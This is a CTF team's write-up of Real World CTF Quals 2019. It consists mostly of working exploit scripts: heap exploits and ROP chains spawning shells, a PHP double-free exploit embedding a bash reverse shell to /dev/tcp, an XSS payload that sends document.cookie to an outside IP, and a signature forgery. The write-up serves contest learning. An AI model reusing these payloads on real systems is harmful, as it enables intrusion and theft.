# Real World CTF Quals 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190913-realworldctfqual/) of this writeup.**


 - [Real World CTF Quals 2019](#real-world-ctf-quals-2019)
   - [Rev](#rev)
     - [Slide Puzzle](#slide-puzzle)
     - [Caidanti](#caidanti)
   - [Pwn](#pwn)
     - [Across the Great Wall](#across-the-great-wall)
     - [faX senDeR](#fax-sender)
     - [anti-antivirus](#anti-antivirus)
     - [MoP](#mop)
       - [open_basedir bypass](#open_basedir-bypass)
   - [Web](#web)
     - [crawl box (unsolved)](#crawl-box-unsolved)
       - [Failed Attempts](#failed-attempts)
     - [Mission Invisible](#mission-invisible)
       - [Failed Attempts](#failed-attempts-1)
   - [Crypto](#crypto)
     - [bank](#bank)


## Rev

### Slide Puzzle


```python=
from z3 import *

mat=[[236, 214, 41, 206, 144, 20, 171, 71, 136, 223, 112, 119, 82, 84, 129, 160, 31, 66, 156, 43, 213, 16, 235, 123, 249, 17, 111, 12, 186, 169, 168, 123, 100, 215, 7],
[37, 226, 208, 205, 100, 142, 9, 222, 136, 62, 161, 52, 161, 197, 53, 114, 89, 73, 129, 202, 228, 226, 93, 75, 248, 213, 13, 93, 204, 210, 46, 160, 142, 153, 44],
[131, 134, 39, 63, 98, 205, 32, 193, 128, 186, 167, 149, 244, 136, 245, 255, 51, 220, 193, 57, 93, 213, 226, 196, 18, 63, 203, 106, 213, 202, 234, 138, 209, 176, 204],
[118, 70, 246, 109, 241, 116, 17, 90, 240, 119, 89, 221, 166, 203, 190, 161, 101, 1, 216, 195, 50, 201, 63, 229, 237, 105, 32, 63, 253, 72, 86, 119, 184, 47, 244],
[220, 164, 221, 62, 14, 154, 191, 133, 208, 99, 89, 153, 126, 93, 49, 179, 38, 193, 61, 93, 190, 76, 28, 27, 232, 37, 154, 34, 114, 109, 82, 122, 145, 98, 131],
[15, 183, 127, 102, 180, 94, 117, 81, 209, 161, 25, 134, 177, 118, 158, 201, 8, 201, 19, 120, 241, 192, 79, 216, 108, 222, 241, 202, 139, 188, 86, 232, 159, 82, 135],
[251, 15, 113, 10, 229, 206, 95, 67, 2, 34, 242, 124, 252, 231, 168, 48, 145, 176, 54, 141, 100, 199, 255, 57, 60, 168, 64, 16, 249, 90, 173, 48, 19, 213, 153],
[102, 176, 252, 137, 161, 198, 135, 197, 121, 29, 181, 26, 188, 69, 111, 26, 237, 30, 139, 81, 154, 49, 85, 78, 106, 163, 202, 124, 134, 96, 84, 14, 86, 9, 163],
[183, 197, 240, 41, 108, 162, 152, 60, 11, 166, 112, 140, 151, 220, 68, 29, 42, 216, 189, 109, 151, 4, 182, 15, 220, 28, 238, 110, 194, 130, 74, 22, 166, 252, 223],
[36, 194, 83, 121, 193, 233, 162, 226, 232, 140, 83, 60, 133, 255, 29, 141, 28, 188, 76, 51, 91, 245, 176, 44, 118, 166, 173, 139, 83, 69, 3, 49, 117, 41, 27],
 [45, 86, 61, 176, 54, 103, 234, 166, 159, 57, 48, 172, 68, 89, 62, 4, 133, 148, 94, 110, 150, 28, 104, 106, 204, 208, 98, 171, 104, 20, 249, 108, 83, 240, 109],
[101, 167, 103, 201, 230, 60, 48, 228, 52, 162, 73, 184, 193, 103, 18, 23, 25, 115, 190, 41, 189, 50, 241, 253, 233, 72, 252, 25, 8, 203, 246, 227, 127, 228, 43],
[183, 80, 117, 153, 67, 44, 125, 178, 235, 4, 24, 15, 124, 103, 247, 101, 165, 89, 18, 10, 73, 108, 115, 181, 132, 245, 213, 138, 98, 174, 230, 204, 245, 226, 129],
[120, 83, 116, 215, 172, 75, 105, 204, 221, 146, 72, 99, 173, 88, 69, 17, 244, 126, 162, 111, 234, 89, 29, 91, 177, 210, 179, 156, 192, 54, 97, 124, 137, 18, 89],
[144, 128, 185, 144, 234, 20, 137, 110, 164, 104, 38, 77, 224, 182, 96, 169, 15, 64, 187, 151, 171, 196, 164, 125, 111, 90, 135, 83, 1, 181, 170, 80, 5, 141, 145],
[153, 199, 233, 200, 217, 155, 65, 33, 140, 145, 144, 131, 72, 151, 86, 145, 94, 57, 84, 135, 218, 117, 148, 48, 35, 173, 33, 210, 41, 97, 86, 165, 189, 207, 22],
[77, 160, 73, 92, 151, 178, 245, 29, 120, 54, 120, 184, 60, 48, 7, 246, 131, 130, 40, 62, 215, 126, 176, 82, 177, 14, 40, 165, 171, 185, 213, 148, 255, 157, 190],
[122, 104, 85, 1, 27, 47, 53, 133, 121, 66, 212, 126, 230, 63, 153, 219, 8, 23, 251, 83, 167, 190, 3, 217, 96, 248, 0, 247, 10, 224, 18, 27, 23, 58, 59],
[163, 93, 143, 1, 251, 92, 247, 141, 58, 228, 141, 93, 107, 51, 219, 93, 184, 187, 238, 31, 38, 148, 204, 119, 57, 13, 210, 249, 175, 13, 38, 57, 86, 57, 243],
[82, 92, 158, 245, 143, 181, 89, 151, 55, 181, 89, 29, 1, 79, 76, 36, 25, 194, 19, 222, 98, 134, 121, 149, 82, 15, 61, 135, 251, 153, 37, 174, 205, 2, 46],
[134, 166, 249, 122, 91, 80, 36, 245, 154, 140, 245, 134, 254, 50, 42, 42, 46, 13, 216, 131, 25, 182, 16, 163, 32, 30, 18, 41, 108, 170, 60, 4, 45, 109, 242],
[141, 25, 7, 101, 230, 134, 153, 244, 113, 228, 128, 151, 226, 49, 50, 21, 71, 190, 5, 139, 178, 220, 84, 125, 77, 243, 106, 13, 3, 8, 214, 211, 107, 98, 120],
[203, 208, 10, 211, 211, 55, 3, 30, 246, 160, 27, 125, 196, 95, 157, 70, 111, 109, 0, 253, 226, 240, 131, 9, 139, 201, 227, 206, 221, 15, 68, 185, 201, 170, 5],
[196, 90, 0, 104, 20, 150, 218, 220, 95, 218, 239, 29, 125, 177, 167, 13, 93, 73, 20, 34, 8, 106, 231, 12, 121, 88, 12, 186, 45, 240, 232, 193, 22, 240, 73],
[170, 145, 187, 181, 53, 42, 90, 152, 23, 128, 6, 253, 166, 115, 220, 243, 173, 103, 112, 177, 62, 98, 157, 140, 149, 88, 7, 141, 129, 74, 2, 237, 144, 63, 214],
[52, 21, 108, 12, 34, 120, 150, 82, 43, 149, 43, 3, 103, 84, 49, 17, 4, 90, 73, 165, 124, 144, 246, 214, 11, 111, 177, 109, 89, 107, 25, 244, 250, 50, 10],
[93, 181, 112, 62, 205, 177, 134, 35, 42, 210, 15, 115, 150, 168, 135, 249, 220, 151, 122, 182, 22, 155, 45, 161, 171, 40, 49, 68, 242, 208, 4, 57, 231, 15, 132],
[46, 128, 62, 177, 99, 165, 101, 98, 54, 164, 6, 214, 7, 238, 34, 221, 126, 213, 127, 117, 199, 145, 191, 163, 38, 53, 73, 175, 33, 10, 150, 103, 187, 30, 29],
[233, 171, 199, 167, 54, 196, 53, 109, 87, 250, 23, 118, 225, 180, 48, 49, 87, 91, 53, 74, 177, 178, 223, 78, 144, 154, 38, 137, 148, 12, 218, 158, 231, 6, 249],
[19, 171, 235, 39, 42, 71, 170, 93, 240, 22, 201, 22, 144, 171, 47, 221, 4, 50, 114, 140, 38, 26, 15, 35, 207, 214, 223, 93, 116, 122, 55, 133, 183, 196, 251],
[168, 3, 16, 234, 188, 196, 5, 207, 227, 40, 178, 108, 10, 92, 2, 44, 87, 100, 68, 217, 254, 242, 123, 75, 20, 152, 195, 107, 100, 153, 126, 79, 55, 112, 203],
[167, 31, 235, 248, 49, 203, 136, 140, 18, 100, 178, 16, 65, 100, 111, 82, 10, 79, 200, 34, 233, 198, 75, 235, 249, 23, 112, 13, 232, 65, 179, 150, 151, 129, 198],
[235, 191, 54, 191, 200, 54, 72, 238, 217, 252, 67, 104, 202, 104, 54, 245, 134, 80, 242, 45, 106, 164, 239, 51, 91, 103, 239, 213, 55, 3, 61, 251, 148, 122, 131],
 [2, 64, 207, 18, 11, 5, 254, 31, 90, 127, 143, 25, 118, 140, 64, 212, 242, 184, 185, 171, 201, 91, 80, 174, 27, 38, 179, 254, 197, 119, 83, 215, 54, 194, 244],
[41, 92, 39, 141, 109, 113, 31, 175, 74, 120, 148, 28, 236, 38, 45, 141, 15, 84, 132, 206, 215, 165, 4, 169, 255, 133, 107, 3, 180, 234, 125, 168, 104, 143, 88]]


flag=[]
s=Solver()
for i in range(35):
  flag.append(Int("flag"+str(i)))

ans=[426252, 446789, 512410, 460475, 398015, 458748, 415766, 414056, 458307, 396230, 384387, 439563, 443097, 429073, 403305, 417219, 444707, 336685, 442240, 378401, 367024, 377385,
431611,
401614,
417547,
300004,
438293,
374362,
440701,
398171,
393955,
447599,
461277,
431759,
388457]

print len(mat[0])


for i in range(35):
  temp=0
  for j in range(35):
    temp+=flag[j]*mat[i][j]
  s.add(temp==ans[i])

print s.check()
print s.model()

ff=""
for i in flag:
  ff+=chr(int(str(s.model()[i])))
print ff


```
### Caidanti


```python=
from pwn import *
context.arch="amd64"
r=remote("fe80::5054:ff:fe63:5e7a%qemu", 31337)
#r=remote("54.177.17.135", 23333)

payload='''
mov rax,0xdead
mov r8,r12 # use r12 leak code text base address
sub r8,0x33a3 # now r8 is  code text base
mov rdi,r8
add rdi,0x3B56
mov rax,r8
add rax,0x10D00
call rax  # Just a put test
mov r8,r12
sub r8,0x33a3
mov r13,r8
mov r9,r8
add r9,0x12140
mov r12,qword ptr [r9]
mov rax,qword ptr [r12]
mov rdi,r12

mov rsi,rsp
add rsi,0x50
mov r15,0x416564614d756f59
mov qword ptr [rsi],r15
mov r15,0x6c6c61434c444946
mov qword ptr [rsi+8],r15
mov r15,0x0
mov qword ptr [rsi+16],r15
mov r15,16
mov qword ptr [rsi+23],r15
mov rdx,rsp
add rdx,0x20
mov rcx,rsp

add rcx,0x40              # rdi = ? rsi = password to getflag rdx = return buf
mov r14,rdi
mov r15,rdx               
call qword ptr [rax+0x38] # send get flag request 
mov rsp,r15
mov rdi,[rsp]
mov rax,r13
add rax,0x10D00
call rax # put(flag)
'''


pp=asm(payload)
print r.recvuntil("114514")
r.sendline("114514")
r.recvuntil("Your code size:")
r.sendline(str(len(pp)))
r.send(pp)

r.interactive()


```

## Pwn

### Across the Great Wall

```python=
import hashlib
from Crypto.Cipher import AES
import sys
from pwn import *
import os
import socket
host = "54.153.22.136" 
#host = "localhost"

#s = process('../../shadow_server')
s = remote("54.153.22.136",3343)
s.recvuntil("at ")
port = int(s.recvline())
print "localhost",port
r = remote(host,port)

def gen_payload(size,data=""):
    timestamp = time.time()
    noise = os.urandom(8)
    m = hashlib.sha256()
    m.update("meiyoumima")
    m.update(p64(timestamp))
    m.update(noise)
    token = m.digest()[:16]
    payload = token
    m = hashlib.sha256()
    m.update("meiyoumima")
    m.update(token)
    secret = m.digest()
    aes = AES.new(secret[:16], AES.MODE_CBC,secret[16:32])
    payload += aes.encrypt(p64(timestamp)+noise)
    m = hashlib.sha256()
    m.update(token+p64(timestamp)+noise+p8(1)+p32(size)+p8(0)+"a"*10+"\x00"*0x20+data)
    hash_sum = m.digest()
    payload += aes.encrypt(p8(1)+p32(size)+p8(0)+"a"*10+hash_sum+data)
    return payload

payload = gen_payload(79)
r.send(payload)

IP = # local public IP

payload = gen_payload(96,"\x01\x01\x01"+
        socket.inet_aton(IP)+
        p16(4444)[::-1]+
        "\x80"*7)
ss = remote(host,port)
ss.send(payload)

l = listen(4444)
_ = l.wait_for_connection()
data = l.recvn(0x60)
idx = data.find("\x7f")
libc = u64(data[idx-5:idx+3])-0x108fbd0
print hex(libc)
#libc = int(raw_input(":"),16)
r.send("a"*0x28+p64(0x4)+"a"*0x448+p64(0x201)+p64(libc+0x3ed8e8))

rr = remote(host,port)
payload = gen_payload(0x220+80-1)
rr.send(payload)

rrr = remote(host,port)
payload = gen_payload(0x220+80-1)
rrr.send(payload)
rrr.send(p64(libc+0xe5858))

s.interactive()




```
### faX senDeR
* delete_msg didn't clean the pointer.
* add_msg with an invalid size, it won't set the new pinter, old pointer remained.
* double free

```python=
#!/usr/bin/env python
from pwn import *

# rwctf{Digging_Into_libxdr}

context.arch = 'amd64'
y = remote( 'tcp.realworldctf.com' , 10917 )

def add_con( len , name , l2 , ip ):
    p = p32( 1 , endian = 'big' )
    p += p32( 1 , endian = 'big' )
    p += p32( len , endian = 'big' ) + name.ljust( len , '\0' )
    p += p32( l2 , endian = 'big' )
    p += ip
    y.send( p.ljust( 0x100 , '\0' ) )
    r = y.recv( 0x1000 )
    print r[:0x20]

def list_con():
    p = p32( 2 , endian = 'big' )
    y.send( p.ljust( 0x100 , '\0' ) )
    r = y.recv( 0x1000 )
    print r[:0x100]

def dle_con( idx ):
    p = p32( 3 , endian = 'big' )
    p += p32( idx , endian = 'big' )
    y.send( p.ljust( 0x100 , '\0' ) )
    r = y.recv( 0x1000 )
    print r[:0x50]

def add_msg( to , l , msg ):
    p = p32( 4 , endian = 'big' )
    p += p32( to , endian = 'big' )
    p += p32( l , endian = 'big' )
    p += msg
    y.send( p.ljust( 0x100 , '\0' )[:0x1000] )
    r = y.recv( 0x1000 )
    print r[:0x20]

def dle_msg( idx ):
    p = p32( 6 , endian = 'big' )
    p += p32( idx , endian = 'big' )
    y.send( p.ljust( 0x100 , '\0' ) )
    r = y.recv( 0x1000 )
    print r[:0x50]

def list_msg():
    p = p32( 5 , endian = 'big' )
    y.send( p.ljust( 0x100 , '\0' ) )
    r = y.recv( 0x1000 )
    print r[:0x100]


add_con( 0x100 , 'a' * 0x50 , 0x10 , '1' * 0x10 )

add_msg( 0 , 0x68 , 'A' * 0x10 )
dle_msg(0)
add_msg( 0 , 0x2000 , 'A' * 0x10 )
dle_msg(0)

free_hook = 0x6BEE98
pop_rdi = 0x400686
pop_rsi = 0x410df3
pop_rdx = 0x44a175
pop_rax = 0x44a11c
syscall = 0x47db6f


p = flat(
    pop_rdi,
    free_hook - 8,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

add_msg( 0 , 0x68 , p64( free_hook - 8 ) )
add_msg( 0 , 0x68 , p )
add_msg( 0 , 0x68 , '/bin/sh\0' + p64( 0x4a9678 ) ) # xchg eax, edi ; xchg eax, esp ; ret

dle_msg(1) # trgger __free_hook -> stack pivot

y.interactive()

```

### anti-antivirus
* Use rarvmtools to create rar file and upload.

```c=
#include <constants.rh>
#include <crctools.rh>
#include <math.rh>
#include <util.rh>
; vim: syntax=fasm

_start:
    mov    [r0],#1752392034
    add    r0,#4
    mov    [r0],#543370528
    add    r0,#4
    mov    [r0],#1935761954
    add    r0,#4
    mov    [r0],#540942440
    add    r0,#4
    mov    [r0],#1986356271
    add    r0,#4
    mov    [r0],#1885565999
    add    r0,#4
    mov    [r0],#808726831
    add    r0,#4
    mov    [r0],#858861870
    add    r0,#4
    mov    [r0],#926298414
    add    r0,#4
    mov    [r0],#892875054
    add    r0,#4
    mov    [r0],#875836463
    add    r0,#4
    mov    [r0],#1043341364
    add    r0,#4
    mov    [r0],#2240806
    add    r0,#4
    mov    r0,#0 
    add     r0,#445497328
    mov     r1,r0
    add     r1,#4111392
    mov     r2,[r1]
    mov     r1,r2
    sub     r1,#619536
    add     r1,#324672 
    mov     r2,r0
    add     r2,#4118760
    mov     [r2],r1
    
    add     r2,#4
    mov     r1,r0
    add     r1,#4111396
    mov     r4,[r1]
    mov     r1,r4 
    mov     [r2],r1
    call    $_success


```

### MoP
First, we find out the commit version `37a8408e8` according to hint, and get diff info as below.

```
$ diff -r php-src/ext/zip/php_zip.c no_realworld_php/ext/zip/php_zip.c
1383d1382
<         ze_obj->filename = NULL;

```
Obviously, There is a double free vulnerability we can exploit at ZipArchive class. 
In zend allocator, `_emalloc` does not check any metadata from the freed chunk,
so we can simply get `arbitray read/write`. 

Leak the libc, overwrite `__free_hook`, and get reverse shell!!


```php=
<?php

function read_ptr(&$mystring,$index=0,$little_endian=1){

return hexdec(dechex(ord($mystring[$index+7])) .dechex(ord($mystring[$index+6])) . dechex(ord($mystring[$index+5])).dechex(ord($mystring[$index+4])).dechex(ord($mystring[$index+3])).dechex(ord($mystring[$index+2])). dechex(ord($mystring[$index+1])).dechex(ord($mystring[$index+0])));

}
    
function write_ptr(&$mystring,$value,$index=0,$little_endian=1){
//$value=dechex($value);
$mystring[$index]=chr($value&0xFF);
$mystring[$index+1]=chr(($value>>8)&0xFF);
$mystring[$index+2]=chr(($value>>16)&0xFF);
$mystring[$index+3]=chr(($value>>24)&0xFF);
$mystring[$index+4]=chr(($value>>32)&0xFF);
$mystring[$index+5]=chr(($value>>40)&0xFF);
$mystring[$index+6]=chr(($value>>48)&0xFF);
$mystring[$index+7]=chr(($value>>56)&0xFF);

}
    function int_to_string($value,$index=0){
        $mystring = "aaaaaaaa";
        $mystring[$index]=chr($value&0xFF);
        $mystring[$index+1]=chr(($value>>8)&0xFF);
        $mystring[$index+2]=chr(($value>>16)&0xFF);
        $mystring[$index+3]=chr(($value>>24)&0xFF);
        $mystring[$index+4]=chr(($value>>32)&0xFF);
        $mystring[$index+5]=chr(($value>>40)&0xFF);
        $mystring[$index+6]=chr(($value>>48)&0xFF);
        $mystring[$index+7]=chr(($value>>56)&0xFF);
        return $mystring;
    }

class SplFixedArray2 extends SplFixedArray{
public function offsetGet($offset) {}
public function Count() {echo "!!!!######!#!#!#COUNT##!#!#!#!#";}
}

$z=array();

for ($x=0;$x<100;$x++){
	$z[$x]=new SplFixedArray(5);
}
unset($z[50]);
$zip = new ZipArchive;
// Double free
$zip->open('/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', ZipArchive::CREATE);
$zip->open('/tmp/z1.zip');
$zip->open('/tmp/z1.zip');
$s=str_repeat('C',0x48);
$t=new SplFixedArray2(5);

unset($z[51]);
unset($z[52]);
$libc_addr=read_ptr($s,0x48)+ 0x2aed7c0;
print "Leak libc memory location: 0x" . dechex($libc_addr) . "\n";



$zip4 = new ZipArchive;
$zip2 = new ZipArchive;
$zip3 = new ZipArchive;

// Double free
$zip4->open('/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', ZipArchive::CREATE);
$zip4->open('/tmp/z1.zip');
$zip4->open('/tmp/z1.zip');

$zip2->open('/tmp/BBBBBBBB', ZipArchive::CREATE);

// first 8 bytes is fd we want to overwrite
$zip2->addFromString('bash -c "bash > /dev/tcp/IP/4444 0>&1";', int_to_string($libc_addr+0x3ed8e8).'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG');
$zip2->addFromString('bash -c "bash > /dec/tcp/IP/4444 0>&1";', "\0\0\0\0\0\0\0".'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG');

//get our chunk, arbitary write,   size cannot change...
$zip2->addFromString('bash -c "bash > /dev/tcp/IP/4444 0>&1";', int_to_string($libc_addr+0x4f440).'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG');

?>


```
#### open_basedir bypass

Rumor has that this exploit still works in this challenge, even if it's PHP 7.4 ~ 8. Then you can get those juicy addresses under `/proc` through `echo file_get_contents('/proc/self/maps');` Actually I didn't realize they still haven't fixed this bug...... It's almost half of a year ago.

Please refer to [@Blaklis_'s tweet (@edgarboda retweets)](https://twitter.com/edgarboda/status/1113839230608797696)


## Web

### crawl box (unsolved)

The server uses scrapy with headless chromium to crawl the page. We search for some keyword about scrapy, and found [this post](https://medium.com/alertot/web-scraping-considered-dangerous-exploiting-the-telnet-service-in-scrapy-1-5-2-ad5260fea0db).

I leverage somd [DNS-based browser port scanning](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/) technique to check that the `127.0.0.1:6023` is opened. The following DNS record for example.com is configured:


```
127.0.0.1 example.com A
240.240.240.240 example.com A

```

And I found that the browser it will never send a request to `240.240.240.240`, which indicates that the port is opened. The reason is that chromium will always resolve to 127.0.0.1 first. For more detail you can refer to [my article]((https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/)).

Unfortunately, only scrapy < 1.5.2 is vulnerable to this RCE explot, because the telnet is not even protected with password. For scrapy >= 1.5.3, the telnet is protected with [8-byte password](https://docs.scrapy.org/en/latest/topics/telnetconsole.html).

Then we got stuck here until the competition ended.

According to [@phithon_xg's twitter](https://twitter.com/phithon_xg/status/1173446436614094849), scrapy will also expose a [web API interface](https://docs.scrapy.org/en/0.16/topics/scrapyd.html#web-interface).


Okay, so maybe next time I'll try to either search for more information about this library, or just browser the official doc.

#### Failed Attempts
- Protocol smuggling to send CSRF to telnet: The telnet will refuse to negotiate for any payload after `\r\n`, so for simple HTTP method it will fail to authenticate. But [@stereotype32's idea](https://twitter.com/stereotype32/status/1173429071826472960) is pretty cool, using DNS rebinding to bypass CORS and send a customized HTTP method.
- Guessing the password: The password has 8 bytes. Although it seems [vulnerable to side-challen attack](https://github.com/twisted/twisted/blob/3b116ebd785f1ea0f9d8bf8fde27874b0f28a3df/src/twisted/cred/credentials.py#L459-L467) in twisted library, it will be too difficult to exploit it using headless chromium.


### Mission Invisible

This is a XSS challenge:



```javascript=
<script>
    var getUrlParam = function (name) {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        var r = unescape(window.location.search.substr(1)).match(reg);
        if (r != null) return r[2];
        return null;
    }

    function setCookie(name, value) {
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
        document.cookie = name + "=" + value + ";expires=" + exp.toGMTString();
    }

    function getCookie(name) {
        var search = name + "="
        var offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length;
            var end = document.cookie.indexOf(";", offset);
            if (end == -1) {
                end = document.cookie.length;
            }
            return unescape(document.cookie.substring(offset, end));
        }
        else return "";
    }

    function setElement(tag) {
        tag = tag.substring(0, 1);
        var ele = document.createElement(tag)
        var attrs = getCookie("attrs").split("&");
        for (var i = 0; i < attrs.length; i++) {
            var key = attrs[i].split("=")[0];
            var value = attrs[i].split("=")[1];
            ele.setAttribute(key, value);
        }
        document.body.appendChild(ele);
    }

    var tag = getUrlParam("tag");
    setCookie("tag", tag);
    setElement(tag);

```

1. Bypass getCookie("attr"): `url?tag=attrs=3`
2. Bypass `;` and `&`: When `getCookie`, it will unescape special characters. We can use percent-encoding `%26` to bypass
3. Using `<a>` to XSS without user interaction: The remote headless chrome bot will not interact with the page, so we have to come out a approach to trigger the XSS without user interaction.
4. Trigger `onfocus` event: We can use hash `url#foo` to trigger the `onfocus` event of an anchor`<a>` element with id `foo`. [Reference](https://blogs.msmvps.com/alunj/2013/04/19/using-url-anchors-to-enliven-xss-exploits/) and [StackOverflow](https://security.stackexchange.com/questions/168909/xss-inside-anchor-tag-a-without-user-interaction).

The key point is the `onfocus` event. It does not come out into my mind magically. First, I list all the attribute of `<a>` to see which events is useful. After that I search for some random keyword of those event with `anchor XSS`. Then ..... bingo.

Payload:


```
http://52.52.236.217:16401/?tag=attrs=id%3Dfoo%2526onfocus%3Djavascript%3Afetch%28%27%2F%2F240.240.240.240%3A1234%3F%27%2Bdocument.cookie%29%2526href%3D%23foo#foo

# rwctf{fR0m1olotH!n9}

```

#### Failed Attempts

- Using CSS to triger javascript: We can inject `style` attribute thus we can perform CSS injection. Unfortunately in modern browsers, they do not support execute javascript in CSS.
- `onmouseevent` + very large canvas: Once the user/bot's mouse moves into the page, it will trigger the event if we set a very large width and height in CSS. However this doesn't work because the remote bot will not interact with the page. There is no mouse event triggered.

## Crypto
### bank


```python=
from pwn import *
from PoW import do_pow
from base64 import b64encode

from schnorr import *

host, port = 'tcp.realworldctf.com', 20014

def login(r, point):
    msg = b64encode('{},{}'.format(*point))
    r.sendlineafter('Please tell us your public key:', msg)

def deposit(r, sig):
    msg = b64encode('1')
    r.sendlineafter('our first priority!', msg)
    msg = b64encode(sig)
    r.sendlineafter('Please send us your signature', msg)

def withdraw(r, sig):
    msg = b64encode('2')
    r.sendlineafter('our first priority!', msg)
    msg = b64encode(sig)
    r.sendlineafter('Please send us your signature', msg)

def get_pubkey(r):
    msg = b64encode('3')
    r.sendlineafter('our first priority!', msg)
    r.recvuntil('one of us: ')
    s = r.recvline()[:-1]
    return eval(s)

def main():
    r = remote(host, port)
    do_pow(r)

    login(r, G)
    sig = schnorr_sign('DEPOSIT', 1)
    deposit(r, sig)

    login(r, G)
    P1 = get_pubkey(r)
    P1_inv = (P1[0], -P1[1])
    P2 = point_add(P1_inv, G)

    login(r, P2)
    sig = schnorr_sign('WITHDRAW', 1)
    withdraw(r, sig)
    r.interactive()

main()

# rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!}

```
